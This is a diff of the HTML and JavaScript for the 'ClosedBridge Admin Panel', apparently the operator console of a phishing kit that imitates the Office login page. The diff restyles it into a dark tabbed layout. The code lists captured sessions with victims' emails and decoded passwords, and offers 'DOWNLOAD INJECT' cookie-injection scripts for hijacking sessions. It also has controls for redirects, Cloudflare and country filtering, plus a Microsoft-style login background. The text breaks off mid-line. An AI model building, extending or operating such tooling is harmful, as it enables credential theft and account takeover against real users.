@@ -22,102 +22,82 @@
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #f8fafc;
-            color: #1e293b;
-            min-height: 100vh;
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-            margin-bottom: 20px;
+            background: #0f172a;
+            color: #e2e8f0;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
         }
 
         .header {
-            padding: 30px 0;
-            text-align: center;
-            border-bottom: 1px solid #e2e8f0;
-            margin-bottom: 30px;
+            background: #1e293b;
+            padding: 16px 24px;
+            border-bottom: 2px solid #334155;
+            flex-shrink: 0;
         }
 
         .header h1 {
-            font-size: 32px;
+            font-size: 24px;
             font-weight: 700;
-            color: #1e293b;
-            margin-bottom: 8px;
+            color: #f1f5f9;
+            margin-bottom: 4px;
         }
 
         .header p {
-            color: #64748b;
-            font-size: 16px;
+            color: #94a3b8;
+            font-size: 14px;
             font-weight: 500;
         }
 
         .auth-section {
-            background: #f1f5f9;
-            border: 1px solid #cbd5e1;
-            padding: 24px;
-            margin-bottom: 24px;
-            border-radius: 8px;
+            background: #1e293b;
+            border-bottom: 1px solid #334155;
+            padding: 16px 24px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            flex-wrap: wrap;
             gap: 16px;
+            flex-shrink: 0;
         }
 
         .auth-section.authenticated {
-            background: #f0fdf4;
+            background: #134e4a;
             border-color: #22c55e;
-        }
-
-        .auth-label {
-            color: #475569;
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 8px;
         }
 
         .auth-form {
             display: flex;
             gap: 12px;
             align-items: center;
-            flex-wrap: wrap;
         }
 
         .token-input {
-            padding: 12px 16px;
-            border: 1px solid #cbd5e1;
+            padding: 10px 16px;
+            border: 1px solid #475569;
             border-radius: 6px;
-            background: #ffffff;
-            color: #1e293b;
+            background: #0f172a;
+            color: #f1f5f9;
             font-size: 14px;
             min-width: 200px;
             outline: none;
-            transition: border-color 0.2s;
         }
 
         .token-input:focus {
             border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
         }
 
         .auth-btn {
             background: #3b82f6;
             color: #fff;
-            padding: 12px 24px;
+            padding: 10px 20px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
             font-weight: 600;
-            transition: background-color 0.2s;
             font-size: 14px;
+            transition: background-color 0.2s;
         }
 
         .auth-btn:hover {
@@ -126,7 +106,6 @@
 
         .logout-btn {
             background: #ef4444;
-            margin-left: 0;
         }
 
         .logout-btn:hover {
@@ -134,108 +113,117 @@
         }
 
         .auth-success {
-            color: #16a34a;
+            color: #22c55e;
             font-weight: 600;
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .dashboard-section {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            margin-bottom: 24px;
+        .main-container {
+            display: flex;
+            flex: 1;
             overflow: hidden;
         }
 
-        .section-header {
-            background: #f8fafc;
-            padding: 16px 20px;
-            border-bottom: 1px solid #e2e8f0;
-            cursor: pointer;
+        .sidebar {
+            width: 240px;
+            background: #1e293b;
+            border-right: 2px solid #334155;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            user-select: none;
-            transition: background-color 0.2s;
+            flex-direction: column;
+            flex-shrink: 0;
+            overflow-y: auto;
         }
 
-        .section-header:hover {
-            background: #f1f5f9;
-        }
-
-        .section-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #1e293b;
-            margin: 0;
-        }
-
-        .dropdown-arrow {
+        .tab-button {
+            padding: 16px 20px;
+            background: transparent;
+            border: none;
+            border-left: 3px solid transparent;
+            color: #94a3b8;
+            text-align: left;
+            cursor: pointer;
             font-size: 14px;
-            color: #64748b;
-            transition: transform 0.2s;
+            font-weight: 600;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .section-content {
-            padding: 20px;
+        .tab-button:hover {
+            background: #334155;
+            color: #f1f5f9;
+        }
+
+        .tab-button.active {
+            background: #334155;
+            border-left-color: #3b82f6;
+            color: #f1f5f9;
+        }
+
+        .content-area {
+            flex: 1;
+            background: #0f172a;
+            overflow-y: auto;
+            padding: 24px;
+        }
+
+        .tab-content {
             display: none;
+            animation: fadeIn 0.3s;
         }
 
-        .section-content.expanded {
+        .tab-content.active {
             display: block;
         }
 
-        .dashboard-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1e293b;
-            margin: 0 0 20px 0;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .dashboard-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
             gap: 16px;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
         .dashboard-card {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
+            background: #1e293b;
+            border: 1px solid #334155;
             border-radius: 8px;
             padding: 20px;
             display: flex;
             align-items: center;
             transition: all 0.2s ease;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
 
         .dashboard-card:hover {
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            transform: translateY(-1px);
+            border-color: #3b82f6;
+            transform: translateY(-2px);
         }
 
         .dashboard-card.success {
             border-color: #22c55e;
-            background: #f0fdf4;
+            background: #134e4a;
         }
 
         .dashboard-card.error {
             border-color: #ef4444;
-            background: #fef2f2;
+            background: #450a0a;
         }
 
         .dashboard-card.info {
             border-color: #3b82f6;
-            background: #eff6ff;
+            background: #172554;
         }
 
         .dashboard-card-icon {
             font-size: 24px;
             margin-right: 16px;
-            opacity: 0.8;
         }
 
         .dashboard-card-content {
@@ -245,26 +233,26 @@
         .dashboard-card-number {
             font-size: 28px;
             font-weight: 700;
-            color: #1e293b;
+            color: #f1f5f9;
             line-height: 1;
             margin-bottom: 4px;
         }
 
         .dashboard-card.success .dashboard-card-number {
-            color: #16a34a;
+            color: #22c55e;
         }
 
         .dashboard-card.error .dashboard-card-number {
-            color: #dc2626;
+            color: #ef4444;
         }
 
         .dashboard-card.info .dashboard-card-number {
-            color: #2563eb;
+            color: #3b82f6;
         }
 
         .dashboard-card-label {
             font-size: 14px;
-            color: #64748b;
+            color: #94a3b8;
             font-weight: 500;
         }
 
@@ -275,177 +263,34 @@
         .form-label {
             display: block;
             font-weight: 600;
-            color: #374151;
+            color: #e2e8f0;
             margin-bottom: 6px;
             font-size: 14px;
         }
 
-        .form-input {
+        .form-input, .form-select {
             width: 100%;
             padding: 12px 16px;
-            border: 1px solid #cbd5e1;
+            border: 1px solid #475569;
             border-radius: 6px;
-            background: #ffffff;
-            color: #1e293b;
+            background: #1e293b;
+            color: #f1f5f9;
             font-size: 14px;
             outline: none;
-            transition: border-color 0.2s;
         }
 
-        .form-input:focus {
+        .form-input:focus, .form-select:focus {
             border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
         }
 
         .form-row {
             display: flex;
             gap: 12px;
-            flex-wrap: wrap;
         }
 
         .form-row .form-group {
             flex: 1;
-            min-width: 200px;
-        }
-
-        .data-table {
-            width: 100%;
-            border-collapse: collapse;
-            background: #ffffff;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid #e2e8f0;
-        }
-
-        .data-table th {
-            background: #f8fafc;
-            padding: 16px;
-            text-align: left;
-            font-weight: 600;
-            color: #374151;
-            border-bottom: 1px solid #e2e8f0;
-            font-size: 14px;
-        }
-
-        .data-table td {
-            padding: 16px;
-            border-bottom: 1px solid #f1f5f9;
-            vertical-align: middle;
-            font-size: 14px;
-            color: #1e293b;
-        }
-
-        .data-table tr:hover td {
-            background: #f8fafc;
-        }
-
-        .data-table tr:last-child td {
-            border-bottom: none;
-        }
-
-        .email-cell {
-            font-weight: 600;
-            color: #1e293b;
-        }
-
-        .password-container {
-            position: relative;
-            display: inline-block;
-            width: 100%;
-        }
-
-        .password-masked,
-        .password-revealed {
-            font-family: 'Inter', sans-serif;
-            background: #f8fafc;
-            padding: 8px 12px;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            font-size: 14px;
-            color: #1e293b;
-        }
-
-        .password-revealed {
-            background: #fff7ed;
-            border-color: #fb923c;
-            word-break: break-all;
-        }
-
-        .reveal-btn {
-            background: #6b7280;
-            color: #fff;
-            padding: 6px 12px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            margin-left: 8px;
-            font-family: 'Inter', sans-serif;
-            transition: background-color 0.2s;
-        }
-
-        .reveal-btn:hover {
-            background: #4b5563;
-        }
-
-        .download-btn {
-            background: #16a34a;
-            color: #fff;
-            padding: 8px 16px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 13px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 600;
-            transition: background-color 0.2s;
-        }
-
-        .download-btn:hover {
-            background: #15803d;
-        }
-
-        .session-info {
-            font-size: 12px;
-            color: #64748b;
-            margin-top: 4px;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .auth-status {
-            margin-bottom: 20px;
-            font-weight: 600;
-            font-size: 16px;
-            color: #1e293b;
-        }
-
-
-
-        /* Scrollbar Styling */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #f1f5f9;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #cbd5e1;
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #94a3b8;
-        }
-
-        .cloudflare-control-panel {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 20px;
         }
 
         .btn {
@@ -456,11 +301,9 @@
             border-radius: 6px;
             cursor: pointer;
             font-weight: 600;
-            transition: background-color 0.2s;
             font-size: 14px;
-            text-decoration: none;
+            transition: background-color 0.2s;
             display: inline-block;
-            text-align: center;
         }
 
         .btn:hover {
@@ -496,48 +339,88 @@
             font-size: 13px;
         }
 
-        .cf-control-btn.cf-emergency {
-            background: #ef4444;
-            border-color: #ef4444;
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #1e293b;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #334155;
         }
 
-        .cf-control-btn.cf-emergency:hover {
-            background: #dc2626;
+        .data-table th {
+            background: #334155;
+            padding: 16px;
+            text-align: left;
+            font-weight: 600;
+            color: #f1f5f9;
+            border-bottom: 1px solid #475569;
+            font-size: 14px;
         }
 
-        .cf-control-btn.cf-disable {
+        .data-table td {
+            padding: 16px;
+            border-bottom: 1px solid #334155;
+            vertical-align: middle;
+            font-size: 14px;
+            color: #e2e8f0;
+        }
+
+        .data-table tr:hover td {
+            background: #334155;
+        }
+
+        .email-cell {
+            font-weight: 600;
+            color: #3b82f6;
+        }
+
+        .password-masked,
+        .password-revealed {
+            background: #0f172a;
+            padding: 8px 12px;
+            border: 1px solid #475569;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #f1f5f9;
+        }
+
+        .password-revealed {
+            background: #422006;
+            border-color: #fb923c;
+            word-break: break-all;
+        }
+
+        .reveal-btn {
             background: #6b7280;
-            border-color: #6b7280;
+            color: #fff;
+            padding: 6px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-left: 8px;
         }
 
-        .cf-control-btn.cf-disable:hover {
+        .reveal-btn:hover {
             background: #4b5563;
         }
 
-        .cf-select {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #cbd5e1;
+        .download-btn {
+            background: #16a34a;
+            color: #fff;
+            padding: 8px 16px;
+            border: none;
             border-radius: 6px;
-            background: #ffffff;
-            color: #1e293b;
-            font-family: 'Inter', sans-serif;
-            font-size: 14px;
-            margin-bottom: 12px;
-            outline: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 600;
         }
 
-        .cf-select:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
-        }
-
-        .control-description {
-            font-size: 14px;
-            color: #64748b;
-            font-style: italic;
-            margin-top: 8px;
-            line-height: 1.4;
+        .download-btn:hover {
+            background: #15803d;
         }
 
         .status-badge {
@@ -549,101 +432,115 @@
         }
 
         .status-success {
-            background: #dcfce7;
-            color: #166534;
+            background: #134e4a;
+            color: #22c55e;
         }
 
         .status-error {
-            background: #fee2e2;
-            color: #991b1b;
+            background: #450a0a;
+            color: #ef4444;
         }
 
         .status-info {
-            background: #dbeafe;
-            color: #1e40af;
+            background: #172554;
+            color: #3b82f6;
         }
 
         .loading, .error, .no-sessions {
             text-align: center;
             padding: 40px;
-            color: #64748b;
+            color: #94a3b8;
             font-size: 16px;
-            font-family: 'Inter', sans-serif;
         }
 
         .error {
-            color: #dc2626;
+            color: #ef4444;
         }
 
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-                padding: 16px;
-            }
+        .session-info {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
 
-            .header h1 {
-                font-size: 24px;
-            }
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
 
-            .auth-section {
-                flex-direction: column;
-                align-items: stretch;
-            }
+        ::-webkit-scrollbar-track {
+            background: #1e293b;
+        }
 
-            .auth-form {
-                justify-content: stretch;
-            }
+        ::-webkit-scrollbar-thumb {
+            background: #475569;
+            border-radius: 4px;
+        }
 
-            .token-input {
-                min-width: auto;
-            }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #64748b;
+        }
 
-            .dashboard-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .form-row {
-                flex-direction: column;
-            }
-
-            .form-row .form-group {
-                min-width: auto;
-            }
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #f1f5f9;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>ClosedBridge Admin Panel</h1>
-            <p>Link Management Room</p>
+    <div class="header">
+        <h1>ClosedBridge Admin Panel</h1>
+        <p>Link Management Room</p>
+    </div>
+
+    <!-- Authentication Section -->
+    <div id="auth-section" class="auth-section">
+        <div id="auth-form" class="auth-form">
+            <input type="password" 
+                   id="token-input" 
+                   class="token-input" 
+                   placeholder="Enter admin token..." 
+                   onkeypress="if(event.key==='Enter') authenticate()">
+            <button onclick="authenticate()" class="auth-btn">Login</button>
+        </div>
+        <div id="auth-success" class="auth-success" style="display: none;">
+            ✅ Access Granted
+            <button onclick="logout()" class="auth-btn logout-btn">Logout</button>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <!-- Sidebar Navigation -->
+        <div class="sidebar">
+            <button class="tab-button active" onclick="switchTab('analytics')">
+                📊 Analytics
+            </button>
+            <button class="tab-button" onclick="switchTab('cloudflare')">
+                ☁️ Cloudflare
+            </button>
+            <button class="tab-button" onclick="switchTab('redirect')">
+                🎯 Redirect
+            </button>
+            <button class="tab-button" onclick="switchTab('security')">
+                🛡️ Security
+            </button>
+            <button class="tab-button" onclick="switchTab('country')">
+                🌍 Country Access
+            </button>
+            <button class="tab-button" onclick="switchTab('sessions')">
+                🗺 Sessions
+            </button>
+            <button class="tab-button" onclick="switchTab('background')" id="background-tab" style="display: none;">
+                🖼 Background
+            </button>
         </div>
 
-        <!-- Authentication Section -->
-        <div id="auth-section" class="auth-section">
-            <div class="auth-label">Authentication Required</div>
-
-            <div id="auth-form" class="auth-form">
-                <input type="password" 
-                       id="token-input" 
-                       class="token-input" 
-                       placeholder="Enter admin token..." 
-                       onkeypress="if(event.key==='Enter') authenticate()">
-                <button onclick="authenticate()" class="auth-btn">Login</button>
-            </div>
-            <div id="auth-success" class="auth-success" style="display: none;">
-                ✅ Access Granted
-                <button onclick="logout()" class="auth-btn logout-btn">Logout</button>
-            </div>
-        </div>
-
-        <!-- Analytics Dashboard -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('analytics')">
-                <h2 class="section-title">📊 Analytics Dashboard</h2>
-                <span class="dropdown-arrow" id="analytics-arrow">▼</span>
-            </div>
-            <div id="analytics-content" class="section-content expanded">
+        <!-- Content Area -->
+        <div class="content-area">
+            <!-- Analytics Tab -->
+            <div id="analytics-tab" class="tab-content active">
+                <h2 class="section-title">Analytics Dashboard</h2>
                 <div class="dashboard-grid">
                     <div class="dashboard-card">
                         <div class="dashboard-card-icon">👥</div>
@@ -675,15 +572,10 @@
                     </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Cloudflare Configuration -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('cloudflare')">
-                <h2 class="section-title">☁️ Cloudflare Configuration</h2>
-                <span class="dropdown-arrow" id="cloudflare-arrow">▼</span>
-            </div>
-            <div id="cloudflare-content" class="section-content">
+            <!-- Cloudflare Tab -->
+            <div id="cloudflare-tab" class="tab-content">
+                <h2 class="section-title">Cloudflare Configuration</h2>
                 <div class="form-row">
                     <div class="form-group">
                         <label class="form-label">Email Address</label>
@@ -712,18 +604,13 @@
                     ⚠️ Not Configured
                 </div>
             </div>
-        </div>
 
-        <!-- Redirect Control -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('redirect')">
-                <h2 class="section-title">🎯 Redirect Control</h2>
-                <span class="dropdown-arrow" id="redirect-arrow">▼</span>
-            </div>
-            <div id="redirect-content" class="section-content">
+            <!-- Redirect Tab -->
+            <div id="redirect-tab" class="tab-content">
+                <h2 class="section-title">Redirect Control</h2>
                 <div class="form-group">
                     <label class="form-label">Current Target URL:</label>
-                    <div id="current-redirect-display" style="padding: 12px; background: #f8fafc; border: 1px solid #e2e8f0; color: #1e293b; font-family: 'Inter', sans-serif; font-size: 14px; border-radius: 6px; word-break: break-all;">
+                    <div id="current-redirect-display" style="padding: 12px; background: #1e293b; border: 1px solid #475569; color: #f1f5f9; border-radius: 6px; word-break: break-all;">
                         Loading...
                     </div>
                 </div>
@@ -763,16 +650,10 @@
                     📍 Status: Ready
                 </div>
             </div>
-        </div>
 
-        <!-- Security Controls -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('security')">
-                <h2 class="section-title">🛡️ Security Controls</h2>
-                <span class="dropdown-arrow" id="security-arrow">▼</span>
-            </div>
-            <div id="security-content" class="section-content">
-
+            <!-- Security Tab -->
+            <div id="security-tab" class="tab-content">
+                <h2 class="section-title">Security Controls</h2>
                 <div class="dashboard-grid">
                     <div class="dashboard-card info">
                         <div class="dashboard-card-icon">📊</div>
@@ -831,16 +712,10 @@
                     </select>
                 </div>
             </div>
-        </div>
 
-        <!-- Country Access Control -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('country')">
-                <h2 class="section-title">🌍 Country Access Control</h2>
-                <span class="dropdown-arrow" id="country-arrow">▼</span>
-            </div>
-            <div id="country-content" class="section-content">
-
+            <!-- Country Access Tab -->
+            <div id="country-tab" class="tab-content">
+                <h2 class="section-title">Country Access Control</h2>
                 <div class="dashboard-grid" style="margin-bottom: 20px;">
                     <div class="dashboard-card">
                         <div class="dashboard-card-icon">📋</div>
@@ -858,8 +733,8 @@
                     </div>
                 </div>
 
-                <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
-                    <h3 style="color: #1e293b; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Create New Country Rule</h3>
+                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Create New Country Rule</h3>
 
                     <div class="form-row">
                         <div class="form-group">
@@ -880,7 +755,7 @@
                         </div>
                     </div>
 
-                    <p style="font-size: 14px; color: #64748b; margin-bottom: 12px;">
+                    <p style="font-size: 14px; color: #94a3b8; margin-bottom: 12px;">
                         Examples: US,CA,GB (US, Canada, UK) | CN,RU,KP (China, Russia, N.Korea) | DE,FR,ES (Germany, France, Spain)
                     </p>
 
@@ -889,24 +764,19 @@
                     </div>
                 </div>
 
-                <div style="background: #ffffff; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px;">
-                    <h3 style="color: #1e293b; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Active Country Rules</h3>
+                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px;">
+                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Active Country Rules</h3>
                     <div id="country-rules-container" style="min-height: 40px;">
-                        <div style="color: #64748b; font-size: 14px; text-align: center; padding: 20px;">
+                        <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 20px;">
                             Loading country rules...
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Sessions Database -->
-        <div class="dashboard-section">
-            <div class="section-header" onclick="toggleSection('sessions')">
-                <h2 class="section-title">🗺 Session Database</h2>
-                <span class="dropdown-arrow" id="sessions-arrow">▼</span>
-            </div>
-            <div id="sessions-content-wrapper" class="section-content expanded">
+            <!-- Sessions Tab -->
+            <div id="sessions-tab" class="tab-content">
+                <h2 class="section-title">Session Database</h2>
                 <div id="loading" class="loading">
                     Loading session data...
                 </div>
@@ -925,44 +795,67 @@
                                 <th>Download</th>
                                 <th>Session Info</th>
                             </tr>
-                </thead>
-                <tbody id="sessions-tbody">
-                </tbody>
-            </table>
-        </div>
+                        </thead>
+                        <tbody id="sessions-tbody">
+                        </tbody>
+                    </table>
+                </div>
 
-        <div id="no-sessions" class="no-sessions" style="display: none;">
-            NO CLASSIFIED SESSIONS FOUND
-        </div>
-    </div>
-
-    <!-- New Section: Background Management -->
-    <div class="dashboard-section" id="background-config-section" style="display: none;">
-        <div class="section-header" onclick="toggleSection('background')">
-            <h2 class="section-title">🖼 Office Login Page Background</h2>
-            <span class="dropdown-arrow" id="background-arrow">▼</span>
-        </div>
-        <div id="background-content" class="section-content">
-            <div class="form-group">
-                <label class="form-label">Office Login Page Background Image URL:</label>
-                <select id="background-url-select" class="form-input" onchange="updateBackgroundUrl()">
-                    <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg">Default Office Background</option>
-                    <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg">Alternative Background 2</option>
-                </select>
+                <div id="no-sessions" class="no-sessions" style="display: none;">
+                    NO CLASSIFIED SESSIONS FOUND
+                </div>
             </div>
-            <div style="margin-top: 12px;">
-                <button onclick="updateBackgroundUrl()" class="btn btn-success">
-                    Save Background
-                </button>
+
+            <!-- Background Tab -->
+            <div id="background-tab-content" class="tab-content">
+                <h2 class="section-title">Office Login Page Background</h2>
+                <div class="form-group">
+                    <label class="form-label">Background Image URL:</label>
+                    <select id="background-url-select" class="form-input" onchange="updateBackgroundUrl()">
+                        <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg">Default Office Background</option>
+                        <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg">Alternative Background 2</option>
+                    </select>
+                </div>
+                <div style="margin-top: 12px;">
+                    <button onclick="updateBackgroundUrl()" class="btn btn-success">
+                        Save Background
+                    </button>
+                </div>
             </div>
         </div>
     </div>
-
 
     <script>
         // Authentication state
         let isAuthenticated = false;
         let adminToken = null;
+
+        // Tab switching function
+        function switchTab(tabName) {
+            // Hide all tab contents
+            const allTabs = document.querySelectorAll('.tab-content');
+            allTabs.forEach(tab => tab.classList.remove('active'));
+
+            // Remove active class from all buttons
+            const allButtons = document.querySelectorAll('.tab-button');
+            allButtons.forEach(btn => btn.classList.remove('active'));
+
+            // Show selected tab
+            const selectedTab = document.getElementById(tabName + '-tab') || document.getElementById(tabName + '-tab-content');
+            if (selectedTab) {
+                selectedTab.classList.add('active');
+            }
+
+            // Activate button
+            event.target.classList.add('active');
+
+            // Load data for specific tabs
+            if (tabName === 'sessions' && isAuthenticated) {
+                loadSessions();
+            } else if (tabName === 'country' && isAuthenticated) {
+                loadCountryRules();
+            }
+        }
 
         // Check if user is already authenticated on page load
         function checkAuthOnLoad() {
@@ -970,11 +863,9 @@
             if (storedToken) {
                 adminToken = storedToken;
                 updateAuthUI(true);
-                // Load analytics immediately
                 setTimeout(() => {
                     loadAnalytics();
                     loadSessions();
-                    // Load Cloudflare config only after authentication is confirmed
                     loadCloudflareConfig();
                     loadBackgroundConfig();
                 }, 100);
@@ -989,29 +880,28 @@
             const authSection = document.getElementById('auth-section');
             const authForm = document.getElementById('auth-form');
             const authSuccess = document.getElementById('auth-success');
-            const authStatus = document.getElementById('auth-status');
             const loading = document.getElementById('loading');
             const sessionsContent = document.getElementById('sessions-content');
             const noSessions = document.getElementById('no-sessions');
-            const backgroundConfigSection = document.getElementById('background-config-section');
+            const backgroundTab = document.getElementById('background-tab');
 
             if (authenticated) {
                 authSection.classList.add('authenticated');
                 authForm.style.display = 'none';
-                authSuccess.style.display = 'block';
+                authSuccess.style.display = 'flex';
                 loading.style.display = 'block';
                 sessionsContent.style.display = 'none';
                 noSessions.style.display = 'none';
-                backgroundConfigSection.style.display = 'block'; // Show background section
+                backgroundTab.style.display = 'block';
             } else {
                 authSection.classList.remove('authenticated');
-                authForm.style.display = 'block';
+                authForm.style.display = 'flex';
                 authSuccess.style.display = 'none';
                 loading.style.display = 'none';
                 sessionsContent.style.display = 'none';
                 noSessions.style.display = 'none';
                 document.getElementById('error').style.display = 'none';
-                backgroundConfigSection.style.display = 'none'; // Hide background section
+                backgroundTab.style.display = 'none';
             }
         }
 
@@ -1026,7 +916,6 @@
             }
 
             try {
-                // Test the token by making a request to the sessions endpoint
                 const response = await fetch('/api/admin/sessions?token=' + encodeURIComponent(token));
 
                 if (response.ok) {
@@ -1034,9 +923,9 @@
                     localStorage.setItem('adminToken', token);
                     updateAuthUI(true);
                     loadSessions();
-                    loadAnalytics(); // Ensure analytics load after authentication
-                    loadCloudflareConfig(); // Load saved Cloudflare configuration
-                    loadBackgroundConfig(); // Load background configuration
+                    loadAnalytics();
+                    loadCloudflareConfig();
+                    loadBackgroundConfig();
                     tokenInput.value = '';
                 } else if (response.status === 401) {
                     alert('ACCESS DENIED: INVALID TOKEN DETECTED');
@@ -1067,12 +956,10 @@
             const button = document.getElementById(`reveal-btn-${index}`);
 
             if (passwordDiv.classList.contains('password-masked')) {
-                // Reveal password
                 passwordDiv.className = 'password-revealed';
                 passwordDiv.textContent = password;
                 button.textContent = 'HIDE';
             } else {
-                // Hide password
                 passwordDiv.className = 'password-masked';
                 const passwordMask = '█'.repeat(Math.min(password.length, 12));
                 passwordDiv.textContent = passwordMask;
@@ -1090,7 +977,6 @@
                 const response = await fetch(`/api/admin/sessions?token=${encodeURIComponent(token)}`);
 
                 if (response.status === 401) {
-                    // Token expired or invalid
                     logout();
                     alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                     return;
@@ -1100,7 +986,6 @@
 
                 document.getElementById('loading').style.display = 'none';
 
-                // Show all sessions (both valid and invalid)
                 if (sessions.sessions.length === 0) {
                     document.getElementById('no-sessions').style.display = 'block';
                     return;
@@ -1112,19 +997,16 @@
                 sessions.sessions.forEach((session, index) => {
                     const row = document.createElement('tr');
 
-                    // Style the row based on status
                     if (session.status === 'invalid') {
-                        row.style.backgroundColor = 'rgba(255, 51, 51, 0.1)';
+                        row.style.backgroundColor = '#450a0a';
                         row.style.borderLeft = '4px solid #ef4444';
                     } else {
-                        row.style.backgroundColor = 'rgba(0, 255, 0, 0.05)';
+                        row.style.backgroundColor = '#134e4a';
                         row.style.borderLeft = '4px solid #22c55e';
                     }
 
-                    // Handle password column - show password for all entries with mask/reveal functionality
                     let passwordColumn = '';
                     if (session.password) {
-                        // Decode base64 password if present
                         let decodedPassword = session.password;
                         try {
                             decodedPassword = atob(session.password);
@@ -1143,18 +1025,14 @@
                             </div>
                         `;
                     } else if (session.status === 'valid') {
-                        // Valid session but no password captured - check if it might be in the session file
-                        passwordColumn = `<span class="status-badge" style="background: #fef3c7; color: #92400e;">⚠️ Password Not Displayed</span>`;
+                        passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">⚠️ Password Not Displayed</span>`;
                     } else if (session.status === 'invalid') {
-                        // Invalid entry - show the reason
                         const reason = session.reason || 'FAILED ENTRY';
                         passwordColumn = `<span class="status-badge status-error">❌ ${reason}</span>`;
                     } else {
-                        // Fallback for other cases
-                        passwordColumn = `<span style="color: #666;">N/A - NO PASSWORD</span>`;
+                        passwordColumn = `<span style="color: #94a3b8;">N/A - NO PASSWORD</span>`;
                     }
 
-                    // Handle inject script column - fix the download URL
                     let injectColumn = '';
                     if (session.status === 'valid' && session.injectFilename) {
                         injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
@@ -1162,17 +1040,15 @@
                                             DOWNLOAD INJECT
                                         </a>`;
                     } else if (session.status === 'valid' && session.id) {
-                        // Try to construct injection filename from session ID
                         const injectFilename = `inject_session_${session.id}.js`;
                         injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
